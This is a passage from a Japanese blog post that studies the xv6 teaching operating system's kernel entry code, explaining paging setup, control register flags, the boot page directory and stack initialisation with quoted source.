&lt;h3 id=&quot;エントリポイントの物理アドレスを定義&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%A8%E3%83%B3%E3%83%88%E3%83%AA%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88%E3%81%AE%E7%89%A9%E7%90%86%E3%82%A2%E3%83%89%E3%83%AC%E3%82%B9%E3%82%92%E5%AE%9A%E7%BE%A9&quot; aria-label=&quot;エントリポイントの物理アドレスを定義 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;エントリポイントの物理アドレスを定義&lt;/h3&gt;
&lt;p&gt;続いてのコードは以下です。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;assembly&quot;&gt;&lt;pre class=&quot;language-assembly&quot;&gt;&lt;code class=&quot;language-assembly&quot;&gt;# By convention, the _start symbol specifies the ELF entry point.
# Since we haven&amp;#39;t set up virtual memory yet, our entry point is
# the physical address of &amp;#39;entry&amp;#39;.
.globl _start
_start = V2P_WO(entry)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;.globl&lt;/code&gt;ディレクティブは、シンボルをリンクされているすべてのファイルから参照可能にするための宣言です。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;_start&lt;/code&gt;はエントリポイントとしてリンカスクリプトなどから参照されていたシンボルですが、この宣言によって&lt;code class=&quot;language-text&quot;&gt;entry.S&lt;/code&gt;の外部からの呼び出しが可能になっています。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://www.google.com/search?q=.globl&amp;#x26;rlz=1C1GCEA_enJP959JP959&amp;#x26;oq=.globl&amp;#x26;aqs=chrome..69i57j0i512j0i10i512j0i10l7.483j0j7&amp;#x26;sourceid=chrome&amp;#x26;ie=UTF-8&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;.globl - Google Search&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;続いて、&lt;code class=&quot;language-text&quot;&gt;_start = V2P_WO(entry)&lt;/code&gt;の行を見てみます。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;V2P_WO&lt;/code&gt;は、&lt;code class=&quot;language-text&quot;&gt;memlayout.h&lt;/code&gt;で定義されている以下のマクロです。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;assembly&quot;&gt;&lt;pre class=&quot;language-assembly&quot;&gt;&lt;code class=&quot;language-assembly&quot;&gt;// Memory layout

#define EXTMEM  0x100000            // Start of extended memory
#define PHYSTOP 0xE000000           // Top physical memory
#define DEVSPACE 0xFE000000         // Other devices are at high addresses

// Key addresses for address space layout (see kmap in vm.c for layout)
#define KERNBASE 0x80000000         // First kernel virtual address
#define KERNLINK (KERNBASE+EXTMEM)  // Address where kernel is linked

#define V2P(a) (((uint) (a)) - KERNBASE)
#define P2V(a) ((void *)(((char *) (a)) + KERNBASE))

#define V2P_WO(x) ((x) - KERNBASE)    // same as V2P, but without casts
#define P2V_WO(x) ((x) + KERNBASE)    // same as P2V, but without casts&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;引数として受け取ったアドレスから&lt;code class=&quot;language-text&quot;&gt;KERNBASE&lt;/code&gt;として設定されている&lt;code class=&quot;language-text&quot;&gt;0x80000000&lt;/code&gt;を引いて返すだけのマクロのようです。&lt;/p&gt;
&lt;p&gt;もともと、リンカではカーネルの&lt;code class=&quot;language-text&quot;&gt;.text&lt;/code&gt;セクションは&lt;code class=&quot;language-text&quot;&gt;0x80100000&lt;/code&gt;をベースにしてリンクされていました。&lt;/p&gt;
&lt;p&gt;これはユーザモードとカーネルモードの仮想メモリ範囲を切り分けて、x86CPUのページング機構によってCPUがカーネルの仮想アドレスをロードするための仕組みです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://yohei.codes/ja/post/xv6-memory-1/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;xv6: OSはどうメモリを参照、管理するのか（前編） - yohei.codes&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;しかし、&lt;code class=&quot;language-text&quot;&gt;_start = V2P_WO(entry)&lt;/code&gt;が実行される段階では、カーネル側で仮想メモリの設定が行われていないため、エントリポイント&lt;code class=&quot;language-text&quot;&gt;_start&lt;/code&gt;を物理アドレスに割り当てるために、&lt;code class=&quot;language-text&quot;&gt;0x80100000&lt;/code&gt;の減算が行われています。&lt;/p&gt;
&lt;h3 id=&quot;カーネルのエントリポイントのロード&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%81%AE%E3%82%A8%E3%83%B3%E3%83%88%E3%83%AA%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88%E3%81%AE%E3%83%AD%E3%83%BC%E3%83%89&quot; aria-label=&quot;カーネルのエントリポイントのロード permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;カーネルのエントリポイントのロード&lt;/h3&gt;
&lt;p&gt;残りの&lt;code class=&quot;language-text&quot;&gt;entry.S&lt;/code&gt;の処理を追っていきます。&lt;/p&gt;
&lt;p&gt;まずは&lt;code class=&quot;language-text&quot;&gt;.globl entry&lt;/code&gt;で&lt;code class=&quot;language-text&quot;&gt;entry&lt;/code&gt;を外部から参照可能なシンボルとしています。&lt;/p&gt;
&lt;p&gt;この&lt;code class=&quot;language-text&quot;&gt;entry&lt;/code&gt;で行っている処理は、簡単に言うとページングを利用してカーネルの仮想アドレスを読み込んでいます。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;entry&lt;/code&gt;ラベルが呼び出しされる時点では、まだページング機構は有効化されていないので、まずはこれを有効化していきます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;assembly&quot;&gt;&lt;pre class=&quot;language-assembly&quot;&gt;&lt;code class=&quot;language-assembly&quot;&gt;# Entering xv6 on boot processor, with paging off.
.globl entry
entry:
  # Turn on page size extension for 4Mbyte pages
  movl    %cr4, %eax
  orl     $(CR4_PSE), %eax
  movl    %eax, %cr4
  # Set page directory
  movl    $(V2P_WO(entrypgdir)), %eax
  movl    %eax, %cr3
  # Turn on paging.
  movl    %cr0, %eax
  orl     $(CR0_PG|CR0_WP), %eax
  movl    %eax, %cr0

  # Set up the stack pointer.
  movl $(stack + KSTACKSIZE), %esp

  # Jump to main(), and switch to executing at
  # high addresses. The indirect call is needed because
  # the assembler produces a PC-relative instruction
  # for a direct jump.
  mov $main, %eax
  jmp *%eax

.comm stack, KSTACKSIZE&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;ページングとは&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%9A%E3%83%BC%E3%82%B8%E3%83%B3%E3%82%B0%E3%81%A8%E3%81%AF&quot; aria-label=&quot;ページングとは permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ページングとは&lt;/h3&gt;
&lt;p&gt;コードを追う前に、ページングについて簡単にまとめます。&lt;/p&gt;
&lt;p&gt;ページングとは、メモリ領域を固定長のサイズ(ページ)に分割して管理する方法です。&lt;/p&gt;
&lt;p&gt;これによって、分割されたメモリ領域をリニアなメモリ空間として扱うことができたり、SSDなどの補助記憶装置に仮想的なページ領域を確保することで、物理メモリの容量以上のメモリ領域を扱うことができます。&lt;/p&gt;
&lt;p&gt;ページングにおいて、主記憶装置から補助記憶装置にページを書き出すことを「ページアウト」、逆に補助記憶装置から主記憶装置にページを書き戻すことを「ページイン」または「スワップイン」と呼びます。&lt;/p&gt;
&lt;p&gt;ページング機構によって、使用されていないメモリ領域はページアウトによって補助記憶装置に保存されます。&lt;/p&gt;
&lt;p&gt;次にそのメモリ領域が必要となる場合、OSは物理メモリ上に存在しないアドレスに対して「ページフォールト」という例外を発生させ、割込みによってスワップインを行い、物理メモリ上にページを書き戻すという挙動が発生します。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://babyron64.hatenablog.com/entry/2017/12/22/210124&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;x86_64アーキテクチャ - ばびろん’s すたっく メモリアクセス&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://babyron64.hatenablog.com/entry/2017/12/22/232423&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;x86_64アーキテクチャ - ばびろん’s すたっく メモリアクセス(続き)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://e-words.jp/w/%E3%83%9A%E3%83%BC%E3%82%B8%E3%83%B3%E3%82%B0.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;ページング（paging）とは - IT用語辞典 e-Words&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ページング機構を有効化するためには、x86CPUでは&lt;code class=&quot;language-text&quot;&gt;CR0(コントロールレジスタ0)&lt;/code&gt;のPGフラグを1にする必要があります。&lt;/p&gt;
&lt;p&gt;実際にページングを有効化している箇所を見ます。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://yukituna.com/3850/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;前回の記事&lt;/a&gt;でプロテクトモード移行時に&lt;code class=&quot;language-text&quot;&gt;CR0(コントロールレジスタ0)&lt;/code&gt;のPEフラグをセットしましたが、この時とやり方はほぼ同じです。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;assembly&quot;&gt;&lt;pre class=&quot;language-assembly&quot;&gt;&lt;code class=&quot;language-assembly&quot;&gt;entry:
  # Turn on page size extension for 4Mbyte pages
  movl    %cr4, %eax
  orl     $(CR4_PSE), %eax
  movl    %eax, %cr4
  # Set page directory
  movl    $(V2P_WO(entrypgdir)), %eax
  movl    %eax, %cr3
  # Turn on paging.
  movl    %cr0, %eax
  orl     $(CR0_PG|CR0_WP), %eax
  movl    %eax, %cr0&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;最後の&lt;code class=&quot;language-text&quot;&gt;# Turn on paging.&lt;/code&gt;以降の処理が、&lt;code class=&quot;language-text&quot;&gt;CR0(コントロールレジスタ0)&lt;/code&gt;のPGフラグをセットしている箇所です。&lt;/p&gt;
&lt;p&gt;各フラグの演算に使っている定数はそれぞれ以下のように定義されています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Control Register flags&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;CR0_PE&lt;/span&gt;          &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;0x00000001&lt;/span&gt;      &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// Protection Enable&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;CR0_WP&lt;/span&gt;          &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;0x00010000&lt;/span&gt;      &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// Write Protect&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;CR0_PG&lt;/span&gt;          &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;0x80000000&lt;/span&gt;      &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// Paging&lt;/span&gt;&lt;/span&gt;

&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;CR4_PSE&lt;/span&gt;         &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;0x00000010&lt;/span&gt;      &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// Page size extension&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ここから、PGフラグだけでなく、WPフラグもセットしていることがわかります。&lt;/p&gt;
&lt;p&gt;WPフラグがセットされると、CPUはリング0のスーパーバイザレベルのプロシージャが読み取り専用ページに時書き込みを行うことを禁止することができます。&lt;/p&gt;
&lt;p&gt;これによってOSで新しいプロセスを作成する際のコピーオンライト方式の実装を容易にすることができます。&lt;/p&gt;
&lt;p&gt;これについては今後の記事で書きます。&lt;/p&gt;
&lt;p&gt;ただ、x86CPUではデフォルトでWPフラグがセットされているはずなので、なぜ明示的に設定しているのかは疑問に感じる点です。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://en.wikipedia.org/wiki/Control_register&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Control register - Wikipedia&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://stackoverflow.com/questions/15275059/whats-the-purpose-of-x86-cr0-wp-bit&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;assembly - whats the purpose of x86 cr0 WP bit? - Stack Overflow&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;次に、CR0の設定より少しさかのぼった以下の箇所を見ていきます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;assembly&quot;&gt;&lt;pre class=&quot;language-assembly&quot;&gt;&lt;code class=&quot;language-assembly&quot;&gt;# Turn on page size extension for 4Mbyte pages
movl    %cr4, %eax
orl     $(CR4_PSE), %eax
movl    %eax, %cr4&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ここでは&lt;code class=&quot;language-text&quot;&gt;CR4(コントロールレジスタ4)&lt;/code&gt;のPSEフラグをセットしています。&lt;/p&gt;
&lt;p&gt;このフラグは、1ページのサイズをコントロールすることができます。&lt;/p&gt;
&lt;p&gt;CR4のPSEフラグがセットされていない(デフォルト)場合、ページのサイズは4KiBになります。&lt;/p&gt;
&lt;p&gt;逆にPSEフラグがセットされている場合、ページサイズは4MiBに拡張されます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://en.wikipedia.org/wiki/Control_register&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Control register - Wikipedia&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ページサイズに2つのサイズが設定されている詳しい背景などは機会があれば別の記事にまとめます。&lt;/p&gt;
&lt;p&gt;xv6OSでは、4MiBのページサイズが設定されていることまでわかりました。&lt;/p&gt;
&lt;p&gt;最後は以下の箇所です。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;assembly&quot;&gt;&lt;pre class=&quot;language-assembly&quot;&gt;&lt;code class=&quot;language-assembly&quot;&gt;# Set page directory
movl    $(V2P_WO(entrypgdir)), %eax
movl    %eax, %cr3&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;xv6OSにおけるページング機構は、この次の行で有効化しているため、この時点ではまだページングが有効になっていません。&lt;/p&gt;
&lt;p&gt;そのため、&lt;code class=&quot;language-text&quot;&gt;$(V2P_WO(entrypgdir))&lt;/code&gt;マクロによって&lt;code class=&quot;language-text&quot;&gt;entrypgdir&lt;/code&gt;のアドレスを物理アドレスに変換してからCR3に書き込んでいます。&lt;/p&gt;
&lt;p&gt;CR3は、ページング機構が有効な場合に使用されるレジスタで、x86CPUがページディレクトリとページテーブルを参照し、リニアアドレスを物理アドレスに変換するために使用されます。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;entrypgdir&lt;/code&gt;は、&lt;code class=&quot;language-text&quot;&gt;main.c&lt;/code&gt;で定義されている構造体配列です。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// main.c&lt;/span&gt;
&lt;span class=&quot;token class-name&quot;&gt;pde_t&lt;/span&gt; entrypgdir&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;token comment&quot;&gt;// For entry.S&lt;/span&gt;

&lt;span class=&quot;token comment&quot;&gt;// The boot page table used in entry.S and entryother.S.&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// Page directories (and page tables) must start on page boundaries,&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// hence the __aligned__ attribute.&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// PTE_PS in a page directory entry enables 4Mbyte pages.&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;__attribute__&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;__aligned__&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;PGSIZE&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token class-name&quot;&gt;pde_t&lt;/span&gt; entrypgdir&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;NPDENTRIES&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token comment&quot;&gt;// Map VA&apos;s [0, 4MB) to PA&apos;s [0, 4MB)&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; PTE_P &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; PTE_W &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; PTE_PS&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
   
  &lt;span class=&quot;token comment&quot;&gt;// Map VA&apos;s [KERNBASE, KERNBASE+4MB) to PA&apos;s [0, 4MB)&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;KERNBASE&lt;span class=&quot;token operator&quot;&gt;&gt;&gt;&lt;/span&gt;PDXSHIFT&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; PTE_P &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; PTE_W &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; PTE_PS&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;配列のサイズは&lt;code class=&quot;language-text&quot;&gt;NPDENTRIES&lt;/code&gt;ですが、これは&lt;code class=&quot;language-text&quot;&gt;mmu.h&lt;/code&gt;で以下の通り1024と定義されています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Page directory and page table constants.&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;NPDENTRIES&lt;/span&gt;      &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;1024&lt;/span&gt;    &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// # directory entries per page directory&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;NPTENTRIES&lt;/span&gt;      &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;1024&lt;/span&gt;    &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// # PTEs per page table&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;PGSIZE&lt;/span&gt;          &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;4096&lt;/span&gt;    &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// bytes mapped by a page&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;entrypgdir&lt;/code&gt;には2つの要素があります。&lt;/p&gt;
&lt;p&gt;正直何をしているのか雰囲気でしか理解していないですが、ここでは単にページディレクトリのエントリを初期化しているようです。&lt;/p&gt;
&lt;p&gt;まず、2つの要素に共通している&lt;code class=&quot;language-text&quot;&gt;(0) | PTE_P | PTE_W | PTE_PS&lt;/code&gt;の行は、以下の定義を行っています。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;0&lt;/code&gt; - すべてのビットを0にする&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;PTE_P&lt;/code&gt; - present をセットする&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;PTE_W&lt;/code&gt; - read\write をセットする&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;PTE_PS&lt;/code&gt; - 4MiB page size bit をセットする&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;1つ目の要素&lt;code class=&quot;language-text&quot;&gt;[0] = (0) | PTE_P | PTE_W | PTE_PS,&lt;/code&gt;では、0番目の要素のページディレクトリエントリをこの値に初期化しています。&lt;/p&gt;
&lt;p&gt;次の要素では、&lt;code class=&quot;language-text&quot;&gt;KERNBASE&gt;&gt;PDXSHIFT&lt;/code&gt; = &lt;code class=&quot;language-text&quot;&gt;0x80000000 &gt;&gt; 22&lt;/code&gt; = 512番目の要素のページディレクトリエントリをこの値に初期化しています。&lt;/p&gt;
&lt;p&gt;この初期化は、次にページング機構を有効化してメイン関数に移行する際に使用するようです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://yohei.codes/ja/post/xv6-memory-1/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;xv6: OSはどうメモリを参照、管理するのか（前編） - yohei.codes&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://stackoverflow.com/questions/58576065/what-does-this-code-mean-in-xv6-entrypgdir&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;what does this code mean in xv6 entrypgdir? - Stack Overflow&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;スタックポインタの設定&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%B9%E3%82%BF%E3%83%83%E3%82%AF%E3%83%9D%E3%82%A4%E3%83%B3%E3%82%BF%E3%81%AE%E8%A8%AD%E5%AE%9A&quot; aria-label=&quot;スタックポインタの設定 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;スタックポインタの設定&lt;/h3&gt;
&lt;p&gt;最後にスタックポインタの設定を行って、main関数に移行します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;assembly&quot;&gt;&lt;pre class=&quot;language-assembly&quot;&gt;&lt;code class=&quot;language-assembly&quot;&gt;# Set up the stack pointer.
movl $(stack + KSTACKSIZE), %esp&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;KSTACKSIZE&lt;/code&gt;は、&lt;code class=&quot;language-text&quot;&gt;param.h&lt;/code&gt;で4096と定義されています。&lt;/p&gt;
